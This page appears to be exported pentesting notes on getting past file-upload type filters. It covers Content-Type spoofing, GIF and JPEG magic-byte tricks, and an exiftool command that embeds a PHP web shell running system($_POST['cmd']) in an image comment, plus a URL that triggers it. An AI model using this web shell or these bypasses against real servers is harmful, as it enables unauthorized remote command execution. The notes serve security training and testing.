<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Bypass Type Filters</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Bypass Type Filters</h1><br/>While extension filters may accept several extensions, content filters usually specify a single category (e.g., images, videos, documents)<br />There are two common methods for validating the file content:<br />• Content-Type Header <br />   ◇ browsers automatically set the Content-Type header when selecting a file through the file selector dialog, usually derived from the file extension. <br />• File Content<br /><br /><strong>Bypass Content-Type &amp; add bytes of a real image</strong><br />1. <span style="text-decoration:underline;">Bypass Content-Type validation</span>: checks by setting the value of the Content-Type header to: image/png , text/plain , application/octet-stream<br />	Content-Type wordlist: <br />   ◇ <a href="https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt">https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt</a> <br />2. <span style="text-decoration:underline;">Bypass File Content validation:</span><h3><br />	</h3>To do that we need to testing the uploaded file&#39;s MIME-Type. Multipurpose Internet Mail Extensions (MIME) is an internet standard that determines the type of a file through its general format and bytes structure<br />	This can be done by inspecting the first few bytes of the file&#39;s content, which contain the <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">File Signature</a> or <a href="https://opensource.apple.com/source/file/file-23/file/magic/magic.mime">Magic Bytes</a><br />	If we change the first bytes of any file to <code>another file type</code> magic bytes, its MIME type would be changed to <code>another file type</code>, regardless of its remaining content or extension.<br />	Usually are used the GIF Magic Bytes becuase GIF is one of the easiest to imitate, as they are ASCII characters, while other extensions have magic bytes in binary non-printable (we should need to URL encode them) for their File/Hex signatures (for example contain a NULL byte), while a GIF image starts with ASCII printable bytes (as shown below). To check them see the <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">list of the signatures on wikipedia</a><br />		<table class="table"><tr><th>Hex signature</th><th>ISO 8859-1</th><th>Offset</th><th>Extension</th><th>Description</th></tr><tr><td>47 49 46 38 37 61
47 49 46 38 39 61</td><td>GIF87a
GIF89a</td><td>0</td><td>gif</td><td>Image file encoded in the Graphics Interchange Format (GIF)[7]</td></tr><tr><td>FF D8 FF EE
FF D8 FF DB
FF D8 FF E0
FF 4F FF 51</td><td>ÿØÿî
ÿØÿÛ
ÿØÿà
ÿOÿQ</td><td>0</td><td>jpeg, jpg</td><td>JPEG raw or in the JFIF or Exif file format[</td></tr></table><br />		<a href=""><img src="images/1989-1.png" alt="images/1989-1.png" /></a><br /><br /><br />3. <span style="text-decoration:underline;">Bypass with metadata inside file</span>: <br />	To use exiftool we need to edit a previously created image(example:img.jpg): <br /><h2>	</h2><div class="codebox"><pre>exiftool -comment=<span style="color:#3ad900;font-weight:400">&#39;&lt;?php echo &#39;</span>Command<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#3ad900;font-weight:400">&#39;; if($_POST){system($_POST[&#39;</span>cmd<span style="color:#3ad900;font-weight:400">&#39;]);} __halt_compiler();&#39;</span> img.jpg<br /><span style="color:#0088ff;font-weight:400">#if it does not work</span><br />exiftool -Comment=<span style="color:#3ad900;font-weight:400">&quot;&lt;?php echo &#39;Command:&#39;; if($_POST){system($_POST[&#39;cmd&#39;]);} __halt_compiler();&quot;</span> img.jpg</pre></div><br />	Check metadata comments with:<br />	<div class="codebox"><pre>img.jpg</pre></div><br />	with this method we do NOT need a shell listening but from the address bar insert the command line:<br />	<div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">/</span>img.jpg?cmd=<span style="color:#ff9d00;font-weight:700">whoami</span></pre></div><br /><br /><br />We can use a combination of the methods discussed above, which may help us bypass some more robust content filters.<br />To do that we can use Burp Intruder Cluster Bomb<br /><br /><br />see also:<br /><a href="https://infinitelogins.com/2020/08/07/file-upload-bypass-techniques/">https://infinitelogins.com/2020/08/07/file-upload-bypass-techniques/</a><br /><a href="https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/">https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/</a><br /><br /><br /><br /><strong>Security Measures</strong><br />• apply filters<br />• turn off execution privileges so the exploits are never executed also if they get uploaded successfully</div>
</body>
</html>
